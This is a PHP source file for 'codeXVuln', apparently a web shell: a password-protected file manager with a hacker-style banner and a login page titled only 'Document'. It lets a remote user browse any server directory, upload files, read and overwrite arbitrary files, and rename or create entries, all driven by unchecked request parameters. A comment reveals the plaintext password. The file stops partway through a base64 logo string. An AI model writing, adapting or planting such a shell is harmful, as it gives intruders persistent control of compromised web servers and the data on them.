<?php

session_name( 'session-codeXVuln' );
session_start();


$password = '$2y$10$yQ4zzKVKdFZgAzRPm3j/Fu02r19mEeQQwpXLUls76iKdAyoYtWlLy';
if(@$_POST['action'] == 'login'){
  cekLogin($_POST['password']);
}
$img = getLogo();

if(!@$_SESSION['login']){
  session_destroy();
  viewLogin();
}
  

$dir = getcwd();
$dir = explode('\\', $dir);
$dir = join("/",$dir);
// print_r($dir);

$dirServer = '';
if($dir[0] == '/'){
  $dirServer = '/';
}
if(@$_GET['dir']){
    $dir = $_GET['dir'];
}

$dirAsal = $dir;
$dirPecah = explode('/', $dirAsal);
$linkTag = '';
$link = '';
// print_r($dirPecah);
for($i = 0; $i < count($dirPecah); $i++){
	if($dirPecah[$i] == "." || $dirPecah[$i] == "" || $dirPecah[$i] == null){
		unset($dirPecah[$i]);
	}else{
		$link .= "/".$dirPecah[$i];
		$linkTag .= '<a href="?dir='.$link.'">'.$dirPecah[$i].'</a>/';
	}
}
// print_r($dirPecah);
$dir = join("/",$dirPecah);
$dir = $dirServer.$dir;
unset($dirPecah[count($dirPecah)-1]);
$dirBack = join("/",$dirPecah);
$dirBack = $dirServer.$dirBack;

if(@$_POST['action']){
    if($_POST['action'] == 'setFile'){
        setFile($_POST['path'], $_POST['text']);
    }
    if($_POST['action'] == 'setRename'){
        setRename($GLOBALS['dir'], $_POST['file'], $_POST['fileNew']);
    }
    if($_POST['action'] == 'Upload'){
	
        upload();
    }
}

if(@$_GET['action']){
    if($_GET['action'] == 'newFolder'){
        createFolder($GLOBALS['dir'], 'New Folder');
    }
    if($_GET['action'] == 'newFile'){
        createFile($GLOBALS['dir'], 'NewFile.txt');
    }
    if($_GET['action'] == 'logout'){
        logout();
    }
}

function upload(){
	$path = $GLOBALS['dir'] .'/'. basename( $_FILES['file']['name']);
	print_r($path);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
}

function edit($file){

    $data = file_get_contents($file);
    $new = htmlspecialchars($data, ENT_QUOTES);

    echo '<form action="?dir='.$GLOBALS['dir'].'" method="post">';
    echo '<input type="hidden" name="path" value="'.$file.'">';
    echo '<textarea rows="40" cols="100" name="text">'.$new.'</textarea>';
    echo '<input type="submit" name="action" value="setFile">';
    echo "</form>";
}

function view($file){

    $data = file_get_contents($file);
    $new = htmlspecialchars($data, ENT_QUOTES);

    echo '<textarea rows="40" cols="100" name="text">'.$new.'</textarea>';
}

function setFile($path, $text){
    file_put_contents($path, $text);
}

function setRename($path, $file, $fileNew){
	rename ($path."/".$file, $path."/".$fileNew);
}

function createFolder($path, $name){
    
    if(!is_dir($path.'/'.$name)){
        if (!mkdir($path.'/'.$name, 0777, true)) {
            die('Failed to create folders...');
        }
    }else{
        echo "Folder sudah ada<br>";
    }
    
}

function createFile($path, $name){
	file_put_contents($path.'/'.$name, '');
}

function urutDirectory($path, $array){
	$tempDir = array();
	$tempFile = array();
	asort($array);
	foreach ($array as $row) {
		$temp = $path."/".$row;
		if(is_dir($temp)){
    		array_push($tempDir, $row);
	    }else{
	    	array_push($tempFile, $row);
	    }
	    
	}
	return array_merge($tempDir, $tempFile);
}

function viewLogin(){
  ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="icon" href="<?=$GLOBALS['img']?>">
  <title>Document</title>
  <style>
  .logo {
    width: 250px;
  }
  body{
    background-color: #4A235A;
  }
  .input-text{
    background-color: #4A235A;
    border: 2px solid white;
    padding: 5px;
    color: white;
    width: 230px;
  }
  
  </style>
</head>
<body>
<br>
<br>
<br>
<center>
<pre style="color:white;">
 ___________________________
< root@codexv:~# akachiro??? >
 ---------------------------
	</pre>
  <img class="logo" src="<?=$GLOBALS['img']?>" alt="">
  <form action="" method="POST">
    <input type="hidden" name="action" value="login">
    <input class="input-text" type="password" name="password">
    <!-- <input type="submit" value="masuk"> -->
  </form>
</center>
</body>
</html>
  <?php
  die();
}
function cekLogin($pass){
  
  if (password_verify($pass, $GLOBALS['password'])) {
    $_SESSION['id'] = 1;
    $_SESSION['login'] = true;
  }
}

function logout(){
  session_destroy();
  header('Location: '.$_SERVER['PHP_SELF']);
}

// password_hash('qwerty123', PASSWORD_DEFAULT)
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="icon" href="<?=$img?>">
    <title>codeXVuln</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <style>
    
    body{
        background-color: #252526;
        color: white;
        padding: 10px;
        font-size: 12px;
    }

    .my-table th, .my-table td{
        border: 1px solid white;
        border-collapse: collapse;
        padding: 7px;
    }

    .my-table tr:hover{
    	background-color: #333333;
    }

    a {
        color: white;
    }

    a:hover{
        color: yellow;
    }

    textarea{
        background-color: #1e1e1e;
    }

    input{
    	background-color: #1e1e1e;
    }

    .my-container{
        /* background-color: #333333; */
    }

    </style>

</head>
<body>

    <div class="my-container">
     
        <h3>codeXVuln</h3>
        <br>
        <div class="row">
          <div class="col-md-6">
            <table style="border: 0px solid white">
                <tr>
                    <td>PHP version</td>
                    <td>:</td>
                    <td><?=phpversion()?></td>
                </tr>
                <tr>
                    <td>Current Dir</td>
                    <td>:</td>
                    <td><?=$linkTag?></td>
                </tr>
            </table>
          </div>
          <div class="col-sm-6">
            <div class="text-right">
              <a href="?action=logout">Logout</a>
            </div>
          </div>
        </div>
        <hr>
        <form action="?dir=<?=$dir?>" method="post" enctype="multipart/form-data">
	        <div class="row">
	        	<input class="col-sm-2" type="file" name="file">
	        	<input type="submit" name="action" value="Upload">
	        </div>
        </form>
        <br>
        <table style="width:100%" class="my-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Last Modified</th>
                    <th>Owner/Group</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
            <?php 
            $dataDir = scandir($dir);
            $dataDir = urutDirectory($dir, $dataDir);
            foreach($dataDir as $entry){

            	$tempFile = $dir."/".$entry;
            ?>
                <tr>
                    <td><?=is_dir($tempFile)?" <a href='?dir=".($entry==".."?$dirBack:$tempFile)."'> <span class='glyphicon glyphicon-folder-open' style='color:#FFDD33'></span> $entry</a><br>":'<span class="glyphicon glyphicon-file" style="color:#CCCCCC"></span> '.$entry?></td>
                    <td><?=is_dir($tempFile)?'dir':'file'?></td>
                    <td><?=!is_dir($tempFile)?filesize($tempFile):''?></td>
                    <td><?=date("F d Y H:i:s.", filemtime($tempFile))?></td>
                    <td><?=fileowner($tempFile)."/".filegroup($tempFile)?></td>
                    <td><?=fileperms($tempFile)?></td>
                    <td>
                        <?php if(!is_dir($tempFile)){?>
                        <a href="?dir=<?=$dir?>&edit=<?=$tempFile?>" class="glyphicon glyphicon-edit"></a> | 
                        <a href="?dir=<?=$dir?>&view=<?=$tempFile?>" class="glyphicon glyphicon-search"></a> | 
                        <?php }else if($entry == '..' || $entry == '.'){ ?>
                        <a href="?dir=<?=$dir?>&action=newFolder" > New Folder</a> | 
                        <a href="?dir=<?=$dir?>&action=newFile" > New File</a> | 
                        <?php } 
                        if($entry != '.' && $entry != '..'){ ?>
                        <a href="?dir=<?=$dir?>&rename=<?=$entry?>"> rename</a>
                        <?php } ?>
                    </td>
                </tr>
            <?php
            }
            ?>
            </tbody>
        </table>
        <hr>
        <?php
        if(@$_GET['rename']){
        ?>
        <form method="POST" action="?dir=<?=$dir?>">
        	<input type="hidden" name="file" value="<?=$_GET['rename']?>" />
        	<input type="text" name="fileNew" value="<?=$_GET['rename']?>" />
        	<input type="submit" name="action" value="setRename" />
        	
        </form>
        <?php
        }
        if(@$_GET['edit']){

            edit($_GET['edit']);
        }
        if(@$_GET['view']){
            view($_GET['view']);
        }
        ?>
    </div>
</body>
</html>
<?php

function getLogo(){

  $img = "
  data:image/png;base64,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